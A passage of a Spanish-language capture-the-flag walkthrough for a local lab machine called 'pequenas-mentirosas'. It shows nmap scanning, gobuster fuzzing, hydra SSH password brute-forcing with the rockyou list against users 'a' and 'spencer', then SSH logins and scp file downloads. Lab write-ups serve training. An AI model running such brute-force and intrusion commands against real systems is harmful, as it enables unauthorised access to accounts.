
**Autora:** [beafn28](https://www.linkedin.com/in/beatriz-fresno-naumova-3797b931b/)

**Dificultad:** Fácil

**Fecha de creación:** 26/09/2024

--------------------------------

DESPLIEGE

```
bash auto_deploy.sh pequenas-mentirosas.tar
```


![](./images/Pasted%20image%2020241121142826.png)


Tenemos la ip :

```
172.17.0.2
```

---------------------------------------------

Ahora hacemos una mapeo con nmap. 


```
nmap -p- -sS -sV -sC --min-rate 5000 -n -vvv -Pn 172.17.0.2
```

![](./images/Pasted%20image%2020241121143122.png)

Tenemos esos dos puertos: 22 y 80. 

Miramos el puerto por http. 

![](./images/Pasted%20image%2020241121143434.png)

Encontramos pista. 

Probamos fuzzzing web a ver si nos encuentra otro directorio. 

``` 
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

![](./images/Pasted%20image%2020241121143645.png)

No nos encuentra nada. 

Vamos a probar hacer fuerza bruta a "A".

```
hydra -l a -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

![](./images/Pasted%20image%2020241121151805.png)

Tenemos el login y la contraseña. 

Ahora intentaremos entrar por ssh. 

```
ssh a@172.17.0.2
```

![](./images/Pasted%20image%2020241121152031.png)

Estamos adentro. 

![](./images/Pasted%20image%2020241121152053.png)

¿Pero quién es "a"?

Vamos a investigar un poco más. 

Nos vamos al directorio donde están los archivos asociados con los servidores, que es `/srv`

![](./images/Pasted%20image%2020241121152442.png)

Nos lo bajamos: 

```
scp a@172.17.0.2:/srv/ftp/* ~/Desktop/
```


![](./images/Pasted%20image%2020241121153452.png)


Investigaremos un poco en esos archivos y encontramos: 


![](./images/Pasted%20image%2020241121153004.png)

Vemos un archivo

![](./images/Pasted%20image%2020241121153943.png)

Spencer puede que podamos hacer un logeo. 

```
hydra -l spencer -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

Y tenemos : 

![](./images/Pasted%20image%2020241121154138.png)

```
ssh spencer@172.17.0.2
```

![](./images/Pasted%20image%2020241121154241.png)

Estamos adentro. 